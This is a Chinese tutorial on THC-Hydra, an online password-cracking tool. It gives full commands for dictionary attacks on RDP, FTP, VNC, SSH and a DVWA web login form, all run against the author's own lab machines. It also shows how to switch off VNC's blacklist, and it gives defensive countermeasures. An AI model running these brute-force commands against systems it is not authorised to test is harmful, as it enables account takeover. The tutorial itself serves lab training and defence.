# 什么是THC-Hydra？

Hydra是一个在线快速破译密码工具，其密码词库支持超过50种网络协议，包括Telnet，RDP，SSH，FTP，HTTP，HTTPS，SMB等等，还支持多种数据库的密码破译，破译速度非常快。THC（黑客优选）社区编写了Hydra，目的是为研究人员及安全顾问展示如何从远程侵入系统。

# 安装THC-Hydra

Kali Linux系统已经自带Hydra，Debian系Linux操作系统通过下述命令安装THC-Dydra程序：

```
Sudo apt-get install hydra
```

或者从THC社区的GitHub地址下载最新版本附件：
<https://github.com/vanhauser-thc/thc-hydra>

使用git从GitHub下载附件：

```
Git clone https://github.com/vanhauser-thc/thc-hydra
```

切换到thc-hydra目录：

```
Cd thc-hydra
```

输入：

```
./configure
```

然后编译：

```
Make
```

安装：

```
Sudo make install
```

至此，安装完毕

# Hydra-GTK

Hydra GTK是hydra的前端图形界面，如果启动后出现这个界面，就表示你已经安装成功。Kali Linux通过下述命令安装：

```
Sudo apt-get install hydra-gtk
```

安装完成之后会出现一个xHydra的新应用，打开之后会出现下述窗口界面：

![](.\Snipaste_2019-04-08_15-54-36.png)

Hydra-GTK项目在GitHub地址为：
<https://github.com/vanhauser-thc/thc-hydra/tree/master/hydra-gtk>，上面有Hydra-GTK最新的版本信息。
在THC的GitHub主页上同样可以下载最新版本的Hydra-GTK。
在THC的GitHub主页上下载Hydra后，文件夹名为thc-hydra，下载Hydra-GTK后，其目录为hydra-gtx。输入下述命令切换目录：

```
Cd hydra-gtk/
```

在进行make之前，还需安装hydra-gtk的依赖包gtk2.0：

```
Sudo apt-get install gtk2.0
```

配置、编译和安装hydra-gtk：

```
./configure
make
sudo make install
```

# THC-Hydra的帮助文件

安装完毕后，可通过hydra –h查看帮助文件，如下：
hydra -h
Hydra v8.6-dev (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

```shell
Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-ISOuvVd46] [service://server[:PORT][/OPT]]

Options:
 -R restore a previous aborted/crashed session
 -I ignore an existing restore file (dont wait 10 seconds)
 -S perform an SSL connect
 -s PORT if the service is on a different default port, define it here
 -l LOGIN or -L FILE login with LOGIN name, or load several logins from FILE
 -p PASS or -P FILE try password PASS, or load several passwords from FILE
 -x MIN:MAX:CHARSET password bruteforce generation, type "-x -h" to get help
 -y disable use of symbols in bruteforce, see above
 -e nsr try "n" null password, "s" login as pass and/or "r" reversed login
 -u loop around users, not passwords (effective! implied with -x)
 -C FILE colon separated "login:pass" format, instead of -L/-P options
 -M FILE list of servers to attack, one entry per line, ':' to specify port
 -o FILE write found login/password pairs to FILE instead of stdout
 -b FORMAT specify the format for the -o FILE: text(default), json, jsonv1
 -f / -F exit when a login/pass pair is found (-M: -f per host, -F global)
 -t TASKS run TASKS number of connects in parallel per target (default: 16)
 -T TASKS run TASKS connects in parallel overall (for -M, default: 64)
 -w / -W TIME waittime for responses (32) / between connects per thread (0)
 -4 / -6 use IPv4 (default) / IPv6 addresses (put always in [] also in -M)
 -v / -V / -d verbose mode / show login+pass for each attempt / debug mode 
 -O use old SSL v2 and v3
 -q do not print messages about connection errors
 -U service module usage details
 server the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)
 service the service to crack (see below for supported protocols)
 OPT some service modules support additional input (-U for module help)

Supported services: adam6500 asterisk cisco cisco-enable cvs ftp ftps http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql(v4) nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 teamspeak telnet[s] vmauthd vnc xmpp

Hydra is a tool to guess/crack valid login/password pairs. Licensed under AGPL
v3.0. The newest version is always available at http://www.thc.org/thc-hydra
Don't use in military or secret service organizations, or for illegal purposes.
These services were not compiled in: postgres sapr3 firebird afp ncp ssh sshkey svn oracle mysql5 and regex support.

Use HYDRA_PROXY_HTTP or HYDRA_PROXY environment variables for a proxy setup.
E.g. % export HYDRA_PROXY=socks5://l:p@127.0.0.1:9150 (or: socks4:// connect://)
 % export HYDRA_PROXY=connect_and_socks_proxylist.txt (up to 64 entries)
 % export HYDRA_PROXY_HTTP=http://login:pass@proxy:8080
 % export HYDRA_PROXY_HTTP=proxylist.txt (up to 64 entries)

Examples:
 hydra -l user -P passlist.txt ftp://192.168.0.1
 hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
 hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
 hydra -l admin -p password ftp://[192.168.0.0/24]/
 hydra -L logins.txt -P pws.txt -M targets.txt ssh
```

# 密码爆破/字典爆破

Hydra可以使用密码字典。相对于使用穷举法来遍历每一种词组组合，使用字典爆破具有更高的效率和成功的概率。
字典爆破的方式是遍历字典中的词组列表，这种方式通常能够加速破解密码的过程，因为密码中通常包含有词组。但如果要破译的密码不包含词组，字典爆破就没有效果。
Kali Linux中已经包含了所有的词组列表，可以通过locate wordlist进行查看。
非Kali Linux系统可以在SkullSecurity.org下载常用词组列表。比如在后文中，我将会用到rockyou.txt。
如果想对某个具体目标进行攻击时，可以使用社工密码字典生成工具CUPP（普通用户密码分析器）来针对目标的精细化密码字典。CUPP会自动记录生日、昵称、地址、宠物名字等相关信息。还可以通过社交媒体工具创建更详细的密码字典。
密码爆破是遍历所有组合来破解密码，比如，密码爆破软件会依次尝试aaaa，aaab，aaac，aaad等等组合。虽然这种方式的失败率会下降，但耗时会大大增加。
Hydra可以通过 –x进行密码爆破选项的配置。通过hydra –x –h查看该项帮助。

```shell
hydra -x -h
Hydra v8.6-dev (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra bruteforce password generation option usage:

  -x MIN:MAX:CHARSET

     MIN     is the minimum number of characters in the password
     MAX     is the maximum number of characters in the password
     CHARSET is a specification of the characters to use in the generation
             valid CHARSET values are: 'a' for lowercase letters,
             'A' for uppercase letters, '1' for numbers, and for all others,
             just add their real representation.
  -y         disable the use if the above letters as placeholders

Examples:
   -x 3:5:a  generate passwords from length 3 to 5 with all lowercase letters
   -x 5:8:A1 generate passwords from length 5 to 8 with uppercase and numbers
   -x 1:3:/  generate passwords from length 1 to 3 containing only slashes
   -x 5:5:/%,.-  generate passwords with length 5 which consists only of /%,.-
   -x 3:5:aA1 -y generate passwords from length 3 to 5 with a, A and 1 only

The bruteforce mode was made by Jan Dlabal, http://houbysoft.com/bfg/
```

# RDP

为了展示RDP协议下Hydra的使用，我用虚拟机安装了windows 2012 server，并允许RDP连接。虚拟机的IP 为192.168.34.16，用户名为administrator。
启动Hydra，载入rockyou字典文件，输入：

```shell
Hydra –t 4 –V –f l administrator –P rockyou.txt rdp://192.168.34.16

-t 4:这个设置表示允许并行连接，本次试验设置为4，意味着允许一次发送4个登录命令。RDP连接的最大连接数就是4.也可以通过-w设置等候时间。
-V:表示在破解成功后显示用户名和密码。
-f:表示在寻找到和用户名相匹配的密码之后就退出。
-l administrator:表示登录名为administrator。
-P rockyou.txt:表示加载的字典文件。
Rdp://192.168.34.16:表示攻击目标的IP地址。
```

开始攻击后，Hydra不断尝试rdp连接，并且因为使用了-f参数，在寻找到和用户名匹配的密码后将自动退出:



在windows 2012 server的安全日志文件中，我们可以看到非常多ID4625的日志。如下图，我们能够清晰的看到攻击来自何处：

如果你是被密码爆破的管理员，则可以通过改变RDP端口防止此种攻击，或通过路由器改变RDP端口来防止此种攻击。
在windows中，注册表中改变RDP端口的方法为，打开注册表，查找子健：

**HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-TCP\PortNumber**

在编辑命令中，点击修改，选择十进制，输入新端口号，点击完成。
然后退出注册表。
重启计算机。
重启后就可以正常的使用RDP连接，但需注意的是，此时，需在地址后加“：”，并输入新的端口号。
另一个防止RDP密码攻击的方法是在windows防火墙策略中设置允许发起RDP连接的IP。我已经做了一个向导文件：
<http://www.hempstutorials.co.uk/restrict-rdp-access-by-ip-address-with-windows-firewall>。

# FTP

如同在RDP展示中一样，我在虚拟机中安装了windows 2012 server，并安装了最新版本的FileZilla Server。下载FileZilla Server地址为：<https://filezilla-project.org/>。

在此我就不详细的讲解如何设置FileZilla服务器的设置，如需设置方法读者们可以自行谷歌。谷歌上到处都是filezilla服务器的设置方法。在本次测试中，我使用的账户是admin，密码是P@ssw0rd。
在终端界面中运行Hydra，注意，我使用了大写L作为参数。大写L意味着一系列的用户名，小写l限定单个用户名。

```
Hydra –t 5 –V –f –L userlist –P passwordlist ftp://192.168.34.16
-t 5:表示同时登陆次数。此处我设置的是5，读者自行设定时注意不要设置太高，否则容易给出错误结果。
-V:每次尝试时终端界面中会显示尝试登录的用户名和密码。
-f:表示当发现和用户名相匹配的密码时自动退出。
-L userlist:大写字母L表示一系列的用户名，小写l限定单个用户名。
-P passwordlist:大写字母P表示我将使用字典，小写字母p表示限定单个密码进行尝试。
ftp://192.168.34.16:表示受攻击的FTP服务器IP地址。
```

枚举了每一次攻击的用户名和密码：

而在FileZilla的控制台你可以看到每次尝试登录记录，在底部为每次攻击有5个登录任务：

在FileZilla，可以通过设置ftp最大失败登录次数防止黑客的用户名和密码爆破。如图，当开启ftp最大失败登录次数的设置后，超过默认的次数10之后IP连接自动中断。

有趣的是虽然IP地址已被禁止连接，Hydra仍然在进行密码爆破，没有任何提示，即使在测试账户名和密码匹配时也一样没有提示。

# VNC

我已搭建好测试环境，在IP为192.168.100.155的虚拟机中安装好linxu和VNC server，密码为P@ssw0rd。Linux Mint的快速设置命令为：

```
Apt-get install vnc4server
Vncpasswd
Password:P@ssw0rd
Verify:P@ssw0rd
Vncserver
```

在VNC过去的版本中，VNC被认为是一个不安全程序，因为VNC连接不要求账户名和密码，VNC也不满足复杂一点的安全要求，但新版本中VNC加入了一个黑名单特性，即5次登陆失败后服务器将会将你加入黑名单禁止再次连接。
为了此次密码爆破能够正常进行，我输入以下命令以便关闭该特性：

```
vncconfig –display :1 –set BlacklistTimeout=0 –set BlacklistThreshold=1000000
```

这个命令能够防止我在此次测试中被VNC服务器加入黑名单，在hydra的命令参数中加入-w来增加每次等待时间，而如果攻击的是以前版本的VNC，则无需额外设置，因为以前版本没有黑名单特性。
还有一点需要注意的是，vnc服务器攻击每次尝试登录的连接数不能超过4个，否则会得到错误结果，同时，因vnc服务器连接不需要账户名，在攻击命令参数中无需-l这个参数。
关闭了黑名单特性之后开始此次攻击：

```
Hydra –P passwordlist –t 1 –w 5 –f –s 5901 192.168.100.155 vnc –v
-P:大写字母P表示使用字典，小写字母p表示限定单个密码进行尝试。
-t 1:设置同时登陆次数。我设置1，但要注意VNC密码爆破不要超过4。
-w 5:设置尝试登录等待时间。我设置为5，但要注意如果黑名单特性未关闭，则等待时间需要设置更高。
-f:表示当发现和用户名相匹配的密码时自动退出。
-s 5901:设置hydra连接VNC服务器端口。通常为5900或5901。本次测试为5901。
192.168.100.155:表示被攻击VNC服务器的IP地址。
-v:表示在终端界面显示每次尝试攻击的密码。
```

如同我所说VNC密码是个著名的漏洞，通常不允许VNC服务器直接在互联网上允许。虽然超时加入黑名单特性能够阻止部分密码爆破，但只要攻击间隔足够长，黑名单特性不起作用，VNC密码仍然会被爆破。
本机运行VNC服务器通过添加 –localhost参数：
Vncserver –localhost
然后用SSH隧道连接：
ssh –L 5901:localhost:5901 user@<serverIP>
在SSH保持连接时，你就可以在本机5901连接VNC客户端。
如果想知道更多SSH隧道连接的知识点击我的向导连接：<http://www.hempstutorials.co.uk/secure-shell-ssh-101/>。
在结束VNC密码爆破前，你可以在home文件夹中一个隐藏文件夹.vnc查看VNC日志。在日志可以看到：
1：客户端信息，2：Hydra连接失败的信息，3：正确连接信息。有趣的是，日志中没有记录发起连接的IP地址，也就是我进行密码爆破的PC地址：

```
1:SConnection: Client needs protocol version 3.7
 SConnection: Client requests security type VncAuth(2)
 SConnection: AuthFailureException: Authentication failure
 Connections: closed: 0.0.0.0::40744 (Authentication failure)
 2: Connections: accepted: 0.0.0.0::40746
 SConnection: Client needs protocol version 3.7
 SConnection: Client requests security type VncAuth(2)
 SConnection: AuthFailureException: Authentication failure
 Connections: closed: 0.0.0.0::40746 (Authentication failure)
 3: Connections: accepted: 0.0.0.0::40748
 SConnection: Client needs protocol version 3.7
 SConnection: Client requests security type VncAuth(2)
 VNCSConnST: Server default pixel format depth 16 (16bpp) little-endian rgb565
 Connections: closed: 0.0.0.0::40748 (Clean disconnection)
 SMsgWriter: framebuffer updates 0
 SMsgWriter: raw bytes equivalent 0, compression ratio -nan
```

# SSH

本次测试虚拟环境为已安装SSH的Linux Mint操作系统，IP地址为192.168.100.155。用户名为admin，密码为：P@ssw0rd。
Linux Mint向导地址：<http://www.hempstutorials.co.uk/installing-linux-mint-in-virtualbox/>。
SSH安装向导地址：<http://www.hempstutorials.co.uk/secure-shell-ssh-101/>。
现在测试环境已搭建完毕，运行SSH的虚拟机也已运行，我们使用以下Hydra命令发起SSH登录爆破：

```
Hydra –l admin –P passwordlist ssh://192.168.100.155 –V
-l admin:l表示限定单个用户名，L表示可以使用用户名列表。
-P passwordlist:P表示使用字典；
ssh://192.168.100.155.表示被攻击SSH服务器地址。
-V:表示每次攻击都在终端界面显示用户名和密码。
```

下图为攻击时终端界面，如图所示。注意，我并没有添加-t参数，这个参数默认同时登陆数为16。

如果有兴趣，可以在/var/log/auth.log查看ssh日志。
为方便阅读ssh日志，可在查看时添加tail命令显示auth.log日志的最后x行。
用以下命令查看最后100行ssh日志：
tail -100 /var/log/auth.log | grep ‘sshd’
若需要防止SSH密码爆破，则可以关闭SSH的密码认证，选择SSH 密钥认证。如果对SSH密钥认证感兴趣，请点击链接：<http://www.hempstutorials.co.uk/secure-shell-ssh-101/>。

# 网页登录

现在，事情开始变得有趣起来，你可以使用hydra进行网页的密码爆破登录。为完成这个工作，你需要一些登录页面的信息，比如登录页面是使用post还是get请求，这样才能使用正确的Hydra命令。
本次测试我进行网页密码爆破登录的页面是DVWA（一个网络脆弱性验证的应用）。有关DVWA的教程详见<http://www.hempstutorials.co.uk/setup-a-vulnerable-lamp-server/>。
同时，需要安装一些代理来进行抓包和确认登录页面的参数以便我们设置正确的hydra命令。本次测试中我使用的是火狐浏览器插件TamperData，用BurpSuite也可以。
Tamper Data火狐插件下载地址为：<https://addons.mozilla.org/en-GB/firefox/addon/tamper-data/>。
首先在浏览器（本次测试使用虚拟机的192.168.100.155/dvwa）中打开DVWA网站，用默认账户和密码的证书登录。

你现在可以对这个登录页面进行密码爆破，但我想在密码爆破之前先进行一些高级设置。
登录后在页面底部左手边的DVWA 安全按钮进行设定，并确保安全等级设为低。

设置好安全等级后，点击左手边密码爆破按钮。

这个登录页面就是本次测试要进行密码爆破的页面。
配置好Tamper Data。这个步骤我通常在火狐浏览器中通过点击工具下拉菜单来进入Tamper Data。

现在Tamper Data已经打开，点击Start Tamper，火狐浏览器的流量就会被Tamper Data代理，这样我们就可以进行抓取登录请求的数据包。



现在回到DVWA，输入用户名和密码点击登录。Tamper Data将会抓取登录请求数据并询问你是否希望Tamper抓取，直接点击Tamper。

回到Tamper Data，右键点击第一个get请求数据包，选择复制。

现在我们看到DVWA网站已经反馈，告诉我们输入了一个错误的用户名或密码。

现在我们已经得到了构建针对该登录页面hydra命令的所有信息。
命令参数基于从Tamper Data得到的所有信息，唯一不一样的部分是PHPSESSID=。命令如下图所示：

```
hydra 192.168.100.155 -V -l admin -P passwordlist http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie: PHPSESSID=rjevaetqb3dqbj1ph3nmjchel2; security=low"
```

192.168.100.155：目标网页登录服务器地址。

```
-V：表示在终端窗口显示每次尝试登录的用户名和密码。
-l admin：l表示限定单个用户名，L表示可以使用用户名列表。
-P passwordlist:P表示使用字典。
```

http-get-form:告诉hydra使用http-get-form模式。
/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login：这些信息复制自tamper data抓取的数据包。
F=Username and/or password incorrect:DVWA反馈的登录失败提示嘻嘻，表示hydra进行了一次失败的登录尝试。
H=Cookie:PHPSESSID=rjevaetqb3dqbj1ph3nmjchel2; security=low:这是登录DVWA时cookie的id，同样在Tamper Data抓取的数据包中也有记录。

输入不同的错误密码之后，如果得到下图反馈的错误提示，这意味着你没有构建一个正确的hydra命令，这时需要检查下命令语法是否正确。
通常可能是PHPSESSID错了，或者登陆失败信息错误。

如果要查阅hydra的http-get-form命令的更多信息，使用
hydra http-get-form –u 查看http-get-form帮助。

```
Help for module http-get-form:
============================================================================
Module http-get-form requires the page and the parameters for the web form.

By default this module is configured to follow a maximum of 5 redirections in
a row. It always gathers a new cookie from the same URL without variables
The parameters take three ":" separated values, plus optional values.
(Note: if you need a colon in the option string as value, escape it with "\:", but do not escape a "\" with "\\".)

Syntax: <url>:<form parameters>:<condition string>[:<optional>[:<optional>]
First is the page on the server to GET or POST to (URL).
Second is the POST/GET variables (taken from either the browser, proxy, etc.
with usernames and passwords being replaced in the "^USER^" and "^PASS^"
placeholders (FORM PARAMETERS)
Third is the string that it checks for an *invalid* login (by default)
Invalid condition login check can be preceded by "F=", successful condition
login check must be preceded by "S=".
This is where most people get it wrong. You have to check the webapp what a
failed string looks like and put it in this parameter!
The following parameters are optional:
C=/page/uri to define a different page to gather initial cookies from
(h|H)=My-Hdr\: foo to send a user defined HTTP header with each request
^USER^ and ^PASS^ can also be put into these headers!
Note: 'h' will add the user-defined header at the end
regardless it's already being sent by Hydra or not.
'H' will replace the value of that header if it exists, by the
one supplied by the user, or add the header at the end
Note that if you are going to put colons (:) in your headers you should escape them with a backslash (\).
All colons that are not option separators should be escaped (see the examples above and below).
You can specify a header without escaping the colons, but that way you will not be able to put colons
in the header value itself, as they will be interpreted by hydra as option separators.

Examples:
"/login.php:user=^USER^&pass=^PASS^:incorrect"
"/login.php:user=^USER^&pass=^PASS^&colon=colon\:escape:S=authlog=.*success"
"/login.php:user=^USER^&pass=^PASS^&mid=123:authlog=.*failed"
"/:user=^USER&pass=^PASS^:failed:H=Authorization\: Basic dT1w:H=Cookie\: sessid=aaaa:h=X-User\: ^USER^"
"/exchweb/bin/auth/owaauth.dll:destination=http%3A%2F%2F<target>%2Fexchange&flags=0&username=<domain>%5C^USER^&password=^PASS^&SubmitCreds=x&trusted=0:reason=:C=/exchweb"
```

